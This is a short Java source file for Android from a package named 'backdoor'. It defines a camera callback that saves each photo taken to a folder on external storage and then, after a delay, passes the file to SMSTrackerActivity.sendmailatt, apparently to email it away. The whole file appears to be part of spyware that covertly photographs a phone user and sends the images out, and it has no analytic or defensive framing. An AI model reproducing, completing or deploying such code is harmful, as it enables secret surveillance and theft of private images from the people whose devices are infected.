package com.example.backdoor;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.os.Environment;
import android.util.Log;

public  class Photo  {
	String path;
	boolean done=false;
protected static final int MEDIA_TYPE_IMAGE = 0; 
FileOutputStream outStream = null;
		    PictureCallback cameraPictureCallbackJpeg = new PictureCallback() {
	            @Override
	            public void onPictureTaken(final byte[] data, Camera camera) {
	            	
	            	
	                          
	                  try {
	                // write to local sandbox file system
	             
	           			    	 Log.d("SENDSMSLOG","wait 5 sec");
	           			  
	                	  File file1 = new File(Environment.getExternalStorageDirectory() + "/MediaPhoto");
	                      if (!file1.exists())
	                      {
	                          file1.mkdirs();
	                      }
	                      path=String.format("/storage/sdcard/MediaPhoto/%d.jpg", System.currentTimeMillis());
	                      Log.d("SENDSMSLOG",path);
	                try {
						outStream = new FileOutputStream(path);
						 outStream.write(data);
			                outStream.close();
			               
					} catch (FileNotFoundException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} 
	               
	                done=true;
	               synchronized (cameraPictureCallbackJpeg) {
					  Log.e("phone", "onPictureTaken - wrote bytes: " + data.length);
					  synchronized(this)
			    		{
						wait(3000);
						Log.d("SENDSMSLOG","Time's up!%n");
			    		}
					  SMSTrackerActivity.sendmailatt(path);
				}
	               // wait(5000);
	              
	                	
	               
	            } catch (FileNotFoundException e) {
	                e.printStackTrace();
	            } catch (IOException e) {
	                e.printStackTrace();
	            } catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} finally {
	            }
	    }
	            
	  };

}
